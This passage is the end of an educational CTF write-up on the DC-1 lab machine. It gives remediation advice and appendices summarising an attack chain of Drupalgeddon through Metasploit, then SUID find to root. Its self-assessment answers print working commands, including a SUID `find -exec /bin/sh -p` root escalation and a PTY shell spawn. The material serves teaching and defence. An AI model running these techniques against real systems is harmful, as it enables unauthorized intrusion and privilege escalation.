**WAF (ModSecurity + OWASP CRS):** blocks known patterns (SQLi, XSS) before they reach the application. It does **not** replace patching — it is a "safety net" for whatever slips through.

**Least privilege:** Apache runs as `www-data` (correct). The error is that `www-data` can read `settings.php` with the database credentials — and that the database runs as root. MySQL should run as `mysql`.

**AIDE / Tripwire:** integrity tools that record file hashes. If a SUID binary or a config file changes, they raise an alert. Without them, a change such as `chmod u+s /usr/bin/find` goes unnoticed.

**AppArmor / SELinux:** restrict what a process can do **even if** it has privileges. With a proper profile, Apache would not be able to execute `/bin/sh` — and the chain would break at the very first step.

**Regular SUID auditing:**

```bash
find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
# compare against a known list /etc/suid-baseline.txt
```

1. **Web Application Update Management (Patch Management):**
   * The Drupal installation must be upgraded immediately to the latest supported security release.
   * Install and properly configure a **Web Application Firewall (WAF)**, such as ModSecurity, with up-to-date rules (OWASP Core Rule Set) for the timely detection and rejection of malicious SQL Injection requests.

2. **Tightening File System Permissions (Least Privilege Principle):**
   * The SUID bit must be removed immediately from the `find` executable, as well as from any other general-purpose utility that does not require special privileges to function properly:
     ```bash
     sudo chmod u-s /usr/bin/find
     ```
   * Implement regular automated integrity and permission checks (e.g., via AIDE, Tripwire, or periodic cron scripts) that scan the system for unauthorized changes to SUID/SGID files.
   * Enable and enforce strict Mandatory Access Control (MAC) policies through **AppArmor** or **SELinux**, preventing processes such as Apache (`www-data`) from executing system administration binaries or spawning PTY shells.

---


## Appendix A — The DC-1 Chain in Five Lines

```
netdiscover  →  192.168.35.131
nmap -sV -p- →  22/80/111, Debian Wheezy, Apache 2.2.22
http://…/    →  Drupal 7.x  →  CVE-2014-3704
msf exploit  →  Meterpreter  →  shell  →  www-data
find -perm   →  SUID /usr/bin/find  →  root  →  thefinalflag.txt
```

## Appendix B — Glossary

| Term | Meaning |
| :--- | :--- |
| **Penetration test** | A controlled attack with authorization and a report |
| **Fingerprinting** | Identification of a service/version |
| **CVE** | Identifier of a published vulnerability |
| **CVSS** | Severity score from 0 to 10 |
| **RCE** | Remote Code Execution |
| **SQLi** | SQL Injection — injection of SQL commands |
| **Prepared statement** | Parameterized query (protects **values**) |
| **Payload / Stager** | What runs on the target / its "carrier" |
| **Meterpreter** | Advanced Metasploit payload |
| **Reverse shell** | The target connects back to the attacker |
| **PTY** | Pseudo-terminal (fully interactive shell) |
| **SUID** | Execution with the owner's privileges |
| **EUID** | Effective User ID — the privileges under which a process runs |
| **Defense in depth** | Multiple independent layers of defense |

## Appendix C — Self-Assessment Questions

1. Why is ARP discovery more reliable than ICMP on a LAN?
2. What does the version string `OpenSSH 6.0p1 Debian 4+deb7u7` tell us about the system?
3. Why is `-p-` essential in a CTF?
4. Describe the root cause of Drupalgeddon: which part of the query is not protected by prepared statements?
5. What does `LHOST` do, and what happens if it is wrong?
6. Why is a "dumb shell" insufficient, and what does `pty.spawn` solve?
7. Explain why SUID on `find` yields root via `-exec`.
8. Why does the same class of finding (SUID) have a lower CVSS score than the RCE?
9. Which **three** measures would have broken the chain, and at which step?

### Suggested Answers

1. On the same LAN, communication relies on MAC addresses, so every live host **must** respond to ARP in order to be reachable, and ARP is not filtered by host firewalls. ICMP (ping) is frequently filtered, so a host may be alive without responding to ping. For this reason, ARP discovery is more reliable locally.
2. The version/package reveals that the system is **Debian 7 (Wheezy)** — old and end-of-life. This suggests that other outdated, vulnerable services are probably also running (kernel, Apache, Drupal), and therefore directs the search toward Wheezy-era CVEs. The link version → distribution → age is key to finding known exploits.
3. By default, nmap scans only the ~1,000 most common ports. In a CTF, critical services are often hidden on **non-standard** ports (e.g., 8080, 31337). `-p-` scans **all 65,535** TCP ports so that no open port is missed.
4. Drupalgeddon (CVE-2014-3704) arises because Drupal 7 allowed the **array keys** of the login request to flow into the construction of the `IN(...)` SQL clause without proper sanitization. Prepared statements protect the **values** (placeholders), but here the tainted element was the **placeholder names/keys** themselves, which dynamically composed the query — that is, the **structure**, not the value. SQL injection therefore succeeds despite the use of prepared statements.
5. `LHOST` is the **attacker's** IP address to which the reverse shell will connect back. If it is wrong (e.g., the target's IP or the wrong interface), the victim attempts to connect to an incorrect or non-existent destination and **we never receive a shell**, even though the exploit "succeeded." It must be the Kali IP address on the shared subnet.
6. A "dumb" shell has no full TTY: it does not support job control (Ctrl-C/Ctrl-Z) or interactive commands (`su`, `ssh`, `passwd`, editors), and it often displays no prompt. `python -c 'import pty; pty.spawn("/bin/bash")'` creates a **pseudo-terminal (PTY)**, yielding a fully interactive shell; with `export TERM=xterm` and stty tricks it becomes stable.
7. `find` with the SUID bit runs with EUID root. `-exec` executes an arbitrary command — e.g., `find . -exec /bin/sh -p \; -quit` — and because find retains root privileges, the shell it launches runs as root (`-p` prevents privileges from being dropped). Hence, a SUID utility that executes commands = a root shell.
8. The RCE (Drupalgeddon) is exploitable **remotely, without authentication**, over the network — maximum impact and a Network attack vector. The SUID-find privesc requires **existing local access** (a local shell); its attack vector is Local and it presupposes a prior compromise, so the CVSS score is lower even though the outcome (root) is severe.
9. (1) **Updating/patching Drupal** → cuts off the RCE at the **initial access** step. (2) **Egress firewall / `ufw default deny` + blocking reverse shells** → even if RCE occurs, no shell is returned (the **payload connection** step). (3) **Removing SUID from `find` (`chmod u-s`/`dpkg-statoverride`) + `nosuid` mounts** → even with a shell as www-data, root cannot be obtained (the **privilege escalation** step). Each one breaks a different link in the chain (defense in depth).

## Appendix D — Checklist

- [ ] Isolated network (NAT Network / Host-Only)
- [ ] Target located via ARP
- [ ] Full port scan + versions
- [ ] CMS and version identified
- [ ] Module selected on the basis of the **version**, not "popularity"
- [ ] Correct `RHOSTS` / `LHOST` / `LPORT`
- [ ] Shell stabilized (PTY + TERM)
- [ ] Enumeration from the inside (`id`, `sudo -l`, configs)
- [ ] SUID and cron checked
- [ ] Root verified with `id`
- [ ] Chain documented for the report
